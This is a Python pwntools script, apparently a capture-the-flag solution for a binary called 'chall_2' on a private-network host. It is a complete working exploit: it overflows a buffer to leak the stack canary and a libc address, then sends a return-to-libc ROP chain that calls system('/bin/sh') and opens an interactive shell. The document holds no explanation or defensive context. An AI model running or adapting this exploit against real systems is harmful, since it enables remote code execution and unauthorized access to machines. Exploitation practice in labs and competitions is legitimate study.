from pwn import *

context.arch = 'amd64'

#io = process("./chall_2")
io = remote("192.168.159.132", 5000)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.sendlineafter(b"Choose an option: ", b"1")

#input("PAUSE")

io.send(b"A"*265)

io.recvuntil(b"A"*265)
leak_canary = u64(b"\x00" +  io.recv(7))

print(f"Leaked canary: {hex(leak_canary)}")

io.sendlineafter(b"Choose an option: ", b"1")

io.send(b"A"*280)

io.recvuntil(b"A"*280)

leak_libc = u64(io.recv(6).ljust(8, b"\x00"))

libc.address = leak_libc - 0x2724a

pop_rdi = libc.address + 0x00000000000277e5
ret = libc.address + 0x0000000000026e99

payload = b"".join([
    b"A"*264,
    p64(leak_canary),  # Canary
    b"B"*8,  # Padding to reach return address
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendlineafter(b"Choose an option: ", b"1")
io.send(payload)

io.interactive()